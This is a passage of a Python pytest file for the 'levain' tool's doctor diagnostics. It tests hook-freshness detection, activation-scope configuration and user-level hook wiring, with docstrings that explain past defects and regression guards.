    false FAILURE must never cost the true one. Derived the same way, so a fourth hooked
    adapter is required to detect real drift and not merely to stay quiet.

    A check that cannot fail is the defect 0.4.0's codex branch already was, inverted."""
    install = _hooked_install(tmp_path, adapter=adapter)
    hooks = sorted((install / "activation" / "hooks").glob("*.py"))
    assert hooks, f"{adapter} fixture built no hooks — the assertion below would be vacuous"
    f = hooks[0]
    f.write_text(f.read_text(encoding="utf-8") + "\n# stale copy\n", encoding="utf-8")
    out = _check_hook_freshness(install)
    assert out and not out[0].ok, f"a stale {adapter} hook must still be caught"
    assert f.name in out[0].detail


def test_hook_freshness_is_silent_on_an_install_with_no_adapter_identity(tmp_path: Path):
    """An incoherent install (hooks present, no tag file, no marker) belongs to
    `run_doctor`'s ADAPTER-DETECTION block, which emits "no adapter detected (no
    CLAUDE.md or AGENTS.md at install root)" and fails the run. Choosing a tree by
    guesswork HERE is what let 0.4.0 manufacture a hook-freshness failure for a defect
    of a different name.

    ⚠ This docstring said "belongs to the LAYOUT check" until 2026-08-03, mirroring the
    same wrong claim in doctor.py's comment. `_check_install_layout` never inspects
    CLAUDE.md or AGENTS.md at all — verified by reproduction: delete CLAUDE.md from a
    healthy install and LAYOUT prints [OK] on both its checks while the FAIL comes from
    the adapter block. The behaviour was always right; the pointer sent the next reader
    to the wrong function, in a TEST, which is where readers go to learn what owns what."""
    install = _hooked_install(tmp_path)
    (install / "CLAUDE.md").unlink()
    assert _check_hook_freshness(install) == []


def test_hook_freshness_passes_when_hooks_match_the_package(tmp_path: Path):
    install = _hooked_install(tmp_path)
    r = _check_hook_freshness(install)[0]
    assert r.ok


def test_hook_freshness_catches_a_stale_installed_hook(tmp_path: Path):
    """The real case: `pip install -U levain` upgrades the package and leaves the
    operator's init-time hook copy on disk, so a hook FIX — which is exactly what a
    bug report produces — reaches nobody who merely upgraded."""
    install = _hooked_install(tmp_path)
    f = install / "activation" / "hooks" / "_levain_hook.py"
    f.write_text(f.read_text(encoding="utf-8") + "\n# stale copy\n", encoding="utf-8")
    r = _check_hook_freshness(install)[0]
    assert not r.ok
    assert "_levain_hook.py" in r.detail
    # the remedy must correct the wrong instinct, not just name a command
    assert "init --force" in r.hint
    assert "pip install -U" in r.hint


def test_hook_freshness_ignores_operator_edits_to_activation_markdown(tmp_path: Path):
    """SCOPE, and it is the load-bearing half. posture.md and recency_directives.md
    live in the same tree and are the files every operator is TOLD to tune. Flagging
    them would fail an operator for doing exactly what the product asks."""
    install = _hooked_install(tmp_path)
    (install / "activation" / "posture.md").write_text(
        "## mine\n\nargue with me\n", encoding="utf-8"
    )
    (install / "activation" / "recency_directives.md").write_text(
        "## mine\n\nno hedging\n", encoding="utf-8"
    )
    assert _check_hook_freshness(install)[0].ok


def test_hook_freshness_tolerates_the_install_time_placeholder_substitution(tmp_path: Path):
    """The installer rewrites _INSTALL_ANNEAL_BIN at copy time, so a byte compare
    would report every healthy install as drifted — the false-positive that would
    have made this check noise and got it ignored."""
    install = _hooked_install(tmp_path)
    f = install / "activation" / "hooks" / "_levain_hook.py"
    f.write_text(
        f.read_text(encoding="utf-8").replace(
            '_INSTALL_ANNEAL_BIN = "{{ANNEAL_MEMORY}}"',
            '_INSTALL_ANNEAL_BIN = "/usr/local/bin/anneal-memory"',
        ),
        encoding="utf-8",
    )
    assert _check_hook_freshness(install)[0].ok


def test_hook_freshness_is_silent_for_a_hookless_install(tmp_path: Path):
    """openhands installs no activation tree; demanding hooks there would fail a
    perfectly healthy sovereign entity."""
    install = tmp_path / "ent"
    install.mkdir()
    assert _check_hook_freshness(install) == []


def test_hook_freshness_is_wired_into_run_doctor(tmp_path: Path, capsys):
    """MUTATION-DRIVEN, and the THIRD time this exact gap appeared in one session:
    the helper was covered and its WIRING was not, so deleting the call from
    `run_doctor` survived. Covered here by running the real entry point."""
    from levain.doctor import run_doctor

    install = _hooked_install(tmp_path)
    (install / "seed").mkdir(parents=True, exist_ok=True)
    f = install / "activation" / "hooks" / "_levain_hook.py"
    f.write_text(f.read_text(encoding="utf-8") + "\n# stale\n", encoding="utf-8")

    run_doctor(install)
    out = capsys.readouterr().out
    assert "hook freshness" in out, "run_doctor never runs the hook-freshness check"
    assert "differ from the package" in out


def test_operator_markdown_lives_outside_the_scanned_directory(tmp_path: Path):
    """Pins the ACTUAL protection (a directory boundary), not the one the docstring
    originally claimed. If activation markdown ever moves into hooks/, or the walk
    widens to activation/, this fails and the exclusion must be made explicit."""
    from levain.install import _templates_root

    with _templates_root() as tr:
        hooks = tr / "activation" / "hooks"
        assert (tr / "activation" / "posture.md").is_file()
        assert not (hooks / "posture.md").exists()
        assert not (hooks / "recency_directives.md").exists()


# ===========================================================================
# 0.4.2 — L3: doctor reports the activation gate (Alex De Groodt, 2026-08-04).
#
# The finding: a green doctor was compatible with the entire activation layer
# being off, because every static check reads FILES and what actually decides
# whether a hook emits anything is a runtime gate doctor never mentioned.
# ===========================================================================

from levain.doctor import (  # noqa: E402
    _check_activation_scope,
    _configured_scope,
    _user_level_wiring,
)


def _scope_install(tmp_path: Path, payload: str | None = None) -> Path:
    (tmp_path / ".levain").mkdir(parents=True, exist_ok=True)
    if payload is not None:
        (tmp_path / ".levain" / "config.json").write_text(payload, encoding="utf-8")
    return tmp_path


class TestConfiguredScope:
    def test_absent_config_is_install_scope(self, tmp_path: Path):
        assert _configured_scope(_scope_install(tmp_path)) == "install"

    def test_global_opt_in(self, tmp_path: Path):
        assert _configured_scope(_scope_install(tmp_path, '{"scope": "global"}')) == "global"

    def test_case_and_whitespace_tolerated(self, tmp_path: Path):
        assert _configured_scope(_scope_install(tmp_path, '{"scope": " GLOBAL "}')) == "global"

    @pytest.mark.parametrize("payload", [
        '{"scope": "globl"}', '{"scope": 1}', '{"scope": null}',
        '{}', 'not json', '[]', '{"other": "global"}',
    ])
    def test_fail_closed(self, tmp_path: Path, payload: str):
        """Anything that is not an exact opt-in reads as install scope — doctor
        must never report 'global' off a malformed config, or it would green-light
        the dark state it exists to catch."""
        assert _configured_scope(_scope_install(tmp_path, payload)) == "install"


class TestScopeAgreesWithHook:
    """doctor._configured_scope and _levain_hook.configured_scope are two
    implementations of one rule (the hook is a template and cannot be imported
    by the package). Two pieces of code computing one fact is exactly how the
    scope key would come to mean different things in doctor and at runtime —
    which is this finding's own class. Pin them together."""

    def _hook(self):
        import importlib.util
        f = (Path(__file__).resolve().parents[1] / "levain" / "templates"
             / "activation" / "hooks" / "_levain_hook.py")
        spec = importlib.util.spec_from_file_location("_levain_hook_scopechk", f)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    @pytest.mark.parametrize("payload", [
        '{"scope": "global"}', '{"scope": "GLOBAL"}', '{"scope": " global "}',
        '{"scope": "globl"}', '{"scope": "install"}', '{"scope": 1}',
        '{}', 'not json', '[]',
    ])
    def test_same_verdict_for_the_same_config(self, tmp_path, monkeypatch, payload):
        install = _scope_install(tmp_path, payload)
        hookmod = self._hook()
        monkeypatch.setattr(hookmod, "install_root", lambda: install)
        monkeypatch.delenv("LEVAIN_SCOPE", raising=False)
        assert _configured_scope(install) == hookmod.configured_scope()

    @pytest.mark.parametrize("payload", [
        None,                     # no config file at all
        '{}',                     # config present, no scope key
        '{"scope": "install"}',   # config present, explicitly install-scoped
        '{"other": 1}',
    ])
    def test_doctor_ignores_LEVAIN_SCOPE(self, tmp_path, monkeypatch, payload):
        """The env var is a per-session override and doctor's env is not the
        session's. Reading it here would report doctor's own environment as
        though it were the entity's — the wrong-artifact reading this check
        exists to stop.

        ⚠ PARAMETERISED DELIBERATELY. The single no-config case did not reach
        the code it was testing: with no config.json the function returns from
        its read-failure branch before any scope resolution runs, so a mutant
        that read LEVAIN_SCOPE further down SURVIVED this test. Caught by
        mutation. The present-but-scopeless cases are the ones that exercise
        the resolution path."""
        install = _scope_install(tmp_path, payload)
        monkeypatch.setenv("LEVAIN_SCOPE", "global")
        assert _configured_scope(install) == "install"


class TestUserLevelWiring:
    def _wire(self, home: Path, rel: tuple[str, ...], install: Path, script: str):
        p = home.joinpath(*rel)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps({"hooks": {"SessionStart": [{"hooks": [{
            "type": "command",
            "command": f"/usr/bin/python3 {install / 'activation' / 'hooks' / script}",
        }]}]}}), encoding="utf-8")

    def test_detects_claude_user_level_wiring(self, tmp_path, monkeypatch):
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        self._wire(home, (".claude", "settings.json"), install, "session_start.py")
        assert _user_level_wiring(install) == [str(home / ".claude" / "settings.json")]

    def test_codex_global_hooks_are_NOT_flagged(self, tmp_path, monkeypatch):
        """⚠ REGRESSION GUARD FOR A DEFECT THAT ALREADY SHIPPED ONCE.

        levain 0.4.0 turned `doctor` permanently red for every Codex operator
        by pointing a check at the wrong tree — in the release built to carry
        this same reporter's previous fixes. The first draft of this check did
        it again: `levain init --adapter codex` WRITES ~/.codex/hooks.json
        itself (Codex has no per-project hooks file), so treating that as
        operator intent fails every Codex install on earth.

        A green suite did not catch it either time. Running `levain doctor`
        against a real Codex install did.
        """
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        self._wire(home, (".codex", "hooks.json"), install, "session_start.py")
        assert _user_level_wiring(install) == []

    def test_a_codex_install_is_never_failed_by_this_check(self, tmp_path, monkeypatch):
        """The end-to-end form of the guard above: a normal Codex install —
        AGENTS.md tag-file, hooks in ~/.codex/hooks.json, no scope opt-in —
        must come back OK, and must still be TOLD where its hooks fire."""
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir(); (install / ".levain").mkdir()
        (install / "AGENTS.md").write_text("# codex", encoding="utf-8")
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        self._wire(home, (".codex", "hooks.json"), install, "session_start.py")
        [r] = _check_activation_scope(install)
        assert r.ok, f"codex install false-FAILed: {r.detail}"
        assert "wired globally" in r.detail
        assert '"scope": "global"' in r.detail

    def test_stale_AGENTS_md_does_not_produce_a_codex_diagnostic(self, tmp_path, monkeypatch):
        """glm L3: `levain init --adapter claude-code --force` over a former
        codex install leaves AGENTS.md behind. Keying the Codex-specific detail
        off that tag-file hands a Claude Code operator a diagnostic about Codex
        hooks their install no longer uses — a wrong-artifact reading inside the
        check written to stop wrong-artifact readings. `effective_adapter` is
        the shared classifier, and it puts CLAUDE.md first."""
        home = tmp_path / "home"; home.mkdir()
        install = tmp_path / "inst"; install.mkdir(); (install / ".levain").mkdir()
        (install / "CLAUDE.md").write_text("# claude", encoding="utf-8")
        (install / "AGENTS.md").write_text("# stale codex leftover", encoding="utf-8")
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
        monkeypatch.delenv("LEVAIN_SCOPE", raising=False)
        [r] = _check_activation_scope(install)
        assert r.ok
        assert "Codex" not in r.detail, (
            f"stale AGENTS.md produced a Codex diagnostic on a claude-code "
            f"install: {r.detail}"
        )

    def test_ignores_wiring_for_a_DIFFERENT_install(self, tmp_path, monkeypatch):
        """Two Levain installs on one machine must not make each other look
        misconfigured."""
        home = tmp_path / "home"
        install = tmp_path / "inst"; other = tmp_path / "other"
        install.mkdir(); other.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        self._wire(home, (".claude", "settings.json"), other, "session_start.py")
        assert _user_level_wiring(install) == []

    def test_no_home_files_is_empty(self, tmp_path, monkeypatch):
        home = tmp_path / "home"; home.mkdir()
        install = tmp_path / "inst"; install.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        assert _user_level_wiring(install) == []

    def test_unreadable_home_settings_is_not_a_crash(self, tmp_path, monkeypatch):
        """Never hard-fail on someone else's config file."""
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir(); (home / ".claude").mkdir(parents=True)
        (home / ".claude" / "settings.json").write_text("{ broken", encoding="utf-8")
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        assert _user_level_wiring(install) == []


class TestActivationScopeCheck:
    def _no_home(self, tmp_path, monkeypatch):
        home = tmp_path / "emptyhome"; home.mkdir(exist_ok=True)
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    def test_default_install_scope_reports_the_condition(self, tmp_path, monkeypatch):
        """Green, but it must SAY where hooks fire — before this, doctor never
        mentioned the gate at all, which is how a dark install read healthy."""
        self._no_home(tmp_path, monkeypatch)
        install = _scope_install(tmp_path / "i")
        [r] = _check_activation_scope(install)
        assert r.ok
        assert "install-scoped" in r.detail
        assert str(install) in r.detail

    def test_global_scope_is_reported(self, tmp_path, monkeypatch):
        self._no_home(tmp_path, monkeypatch)
        install = _scope_install(tmp_path / "i", '{"scope": "global"}')
        [r] = _check_activation_scope(install)
        assert r.ok
        assert "global" in r.detail

    def test_the_dark_configuration_FAILS(self, tmp_path, monkeypatch):
        """Alex's exact state: hooks wired at user level, scope left at the
        default, so they fire everywhere and then suppress themselves. This is
        the one combination that is not a soft reading — it is an outage."""
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir(); (install / ".levain").mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        p = home / ".claude" / "settings.json"
        p.parent.mkdir(parents=True)
        p.write_text(json.dumps({"hooks": {"UserPromptSubmit": [{"hooks": [{
            "type": "command",
            "command": f"python3 {install / 'activation' / 'hooks' / 'user_prompt_submit.py'}",
        }]}]}}), encoding="utf-8")

        [r] = _check_activation_scope(install)
        assert not r.ok
        assert "user level" in r.detail
        # The remedy must be the thing that actually fixes it.
        assert '{"scope": "global"}' in (r.hint or "")
        assert "LEVAIN_SCOPE=global" in (r.hint or "")

    def test_user_level_wiring_with_global_scope_is_fine(self, tmp_path, monkeypatch):
        """Once opted in, user-level wiring is the CORRECT deployment — it must
        not be reported as a problem."""
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir(); (install / ".levain").mkdir()
        (install / ".levain" / "config.json").write_text('{"scope": "global"}', encoding="utf-8")
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        p = home / ".claude" / "settings.json"
        p.parent.mkdir(parents=True)
        p.write_text(json.dumps({"hooks": {"SessionStart": [{"hooks": [{
            "type": "command",
            "command": f"python3 {install / 'activation' / 'hooks' / 'session_start.py'}",
        }]}]}}), encoding="utf-8")
        [r] = _check_activation_scope(install)
        assert r.ok


# ===========================================================================
# 0.4.2 L3 findings — defects in the ABOVE checks, found by the review mesh.
# Each of these is a bug in code written earlier in this same release.
# ===========================================================================

from levain.doctor import _env_scope_caveat, _user_entry_targets  # noqa: E402


class TestEnvScopeCaveat:
    """CONSENSUS L3 finding (two independent seats, both HIGH).

    `_configured_scope` reads only the config file. That is right for "what
    does the install declare", and WRONG as the whole report: an operator who
    exports LEVAIN_SCOPE from a shell profile has changed every real session,
    including doctor's own. Silence there misreported in both directions —
    green while dark, and a hard FAIL on a working install.
    """

    def test_no_caveat_when_unset(self, monkeypatch):
        monkeypatch.delenv("LEVAIN_SCOPE", raising=False)
        assert _env_scope_caveat() == ""

    def test_caveat_names_the_value_and_the_ambiguity(self, monkeypatch):
        monkeypatch.setenv("LEVAIN_SCOPE", "global")
        note = _env_scope_caveat()
        assert "LEVAIN_SCOPE=global" in note
        assert "persistently" in note

    def test_caveat_reports_the_EFFECTIVE_scope_not_the_raw_value(self, monkeypatch):
        """A typo resolves to install scope at runtime; the note must say so
        rather than echoing the raw string as though it were meaningful."""
        monkeypatch.setenv("LEVAIN_SCOPE", "globl")
        assert "resolves to install scope" in _env_scope_caveat()

    def test_caveat_rides_every_branch(self, tmp_path, monkeypatch):
        home = tmp_path / "h"; home.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
        install = _scope_install(tmp_path / "i")
        monkeypatch.setenv("LEVAIN_SCOPE", "global")
        assert "LEVAIN_SCOPE=global" in _check_activation_scope(install)[0].detail
        (install / ".levain" / "config.json").write_text('{"scope":"global"}')
        assert "LEVAIN_SCOPE=global" in _check_activation_scope(install)[0].detail

    def test_no_false_FAIL_when_the_env_var_opens_the_gate(self, tmp_path, monkeypatch):
        """The damaging half. Hooks wired at user level + install-scoped config
        would FAIL — but with LEVAIN_SCOPE=global exported, the gate is open and
        the install is working. Failing it sends the operator to fix nothing."""
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir(); (install / ".levain").mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
        p = home / ".claude" / "settings.json"; p.parent.mkdir(parents=True)
        p.write_text(json.dumps({"hooks": {"SessionStart": [{"hooks": [{
            "type": "command",
            "command": f"python3 {install / 'activation' / 'hooks' / 'session_start.py'}",
        }]}]}}))
        monkeypatch.delenv("LEVAIN_SCOPE", raising=False)
        assert not _check_activation_scope(install)[0].ok      # dark: correct FAIL
        monkeypatch.setenv("LEVAIN_SCOPE", "global")
        assert _check_activation_scope(install)[0].ok          # not dark: no FAIL


class TestUserEntryTargets:
    """L3 codex findings 3, 5 and 7 — all in `_user_level_wiring`'s scanning."""

    def _cmd(self, install, script):
        return f"/usr/bin/python3 {install / 'activation' / 'hooks' / script}"

    def test_finds_levain_behind_a_FOREIGN_hook(self, tmp_path):
        """codex#3: the old helper returned on the FIRST command it found, so a
        foreign hook registered ahead of Levain's hid it completely and the dark
        configuration went unreported."""
        install = tmp_path / "i"; install.mkdir()
        entries = [
            {"hooks": [{"type": "command", "command": "/usr/bin/env somebody-elses-hook"}]},
            {"hooks": [{"type": "command", "command": self._cmd(install, "session_start.py")}]},
        ]
        assert _user_entry_targets(entries, install, "session_start.py") is True

    def test_finds_levain_as_a_LATER_hook_in_one_entry(self, tmp_path):
        install = tmp_path / "i"; install.mkdir()
        entries = [{"hooks": [
            {"type": "command", "command": "/usr/bin/env other"},
            {"type": "command", "command": self._cmd(install, "session_start.py")},
        ]}]
        assert _user_entry_targets(entries, install, "session_start.py") is True

    def test_placeholder_wiring_is_NOT_this_install(self, tmp_path):
        """codex#5: at user level `${CLAUDE_PROJECT_DIR}` expands to whatever
        project is open, so such a command never runs THIS install's hook.
        Substituting the install (right for the install's own settings file)
        would send the operator to fix a scope that was never the problem."""
        install = tmp_path / "i"; install.mkdir()
        entries = [{"hooks": [{"type": "command",
                               "command": "python3 ${CLAUDE_PROJECT_DIR}/activation/hooks/session_start.py"}]}]
        assert _user_entry_targets(entries, install, "session_start.py") is False

    @pytest.mark.parametrize("entries", [
        [None],
        [{"hooks": [None]}],
        [{"hooks": "not-a-list"}],
        [{"hooks": [{"command": None}]}],
        [{"hooks": [{"command": 42}]}],
        [{"hooks": [{"command": 'unbalanced "quote'}]}],
        ["a string"],
        [{}],
    ])
    def test_never_raises_on_a_malformed_foreign_config(self, tmp_path, entries):
        """codex#7: `{"hooks":{"SessionStart":[null]}}` reached `entry.get` on
        None. The AttributeError escaped `_user_level_wiring`'s (OSError,
        ValueError) catch and ABORTED the whole doctor run — breaking the
        function's own documented promise never to hard-fail on someone else's
        config file."""
        install = tmp_path / "i"; install.mkdir()
        assert _user_entry_targets(entries, install, "session_start.py") is False

    def test_doctor_survives_a_null_entry_end_to_end(self, tmp_path, monkeypatch):
        home = tmp_path / "home"; install = tmp_path / "inst"
        install.mkdir(); (install / ".levain").mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
        monkeypatch.delenv("LEVAIN_SCOPE", raising=False)
        p = home / ".claude" / "settings.json"; p.parent.mkdir(parents=True)
        p.write_text('{"hooks":{"SessionStart":[null]}}')
        [r] = _check_activation_scope(install)   # must not raise
        assert r.ok


class TestClaudeConfigDir:
    """codex#4: CLAUDE_CONFIG_DIR relocates the whole ~/.claude tree. Reading
    only the home path checks a directory Claude Code is not using, and
    false-greens the dark configuration."""

    def test_wiring_found_under_CLAUDE_CONFIG_DIR(self, tmp_path, monkeypatch):
        home = tmp_path / "home"; home.mkdir()
        alt = tmp_path / "altcfg"; alt.mkdir()
        install = tmp_path / "inst"; install.mkdir()
        monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
        monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(alt))
        (alt / "settings.json").write_text(json.dumps({"hooks": {"SessionStart": [{"hooks": [{
            "type": "command",
            "command": f"python3 {install / 'activation' / 'hooks' / 'session_start.py'}",
        }]}]}}))
        assert _user_level_wiring(install) == [str(alt / "settings.json")]
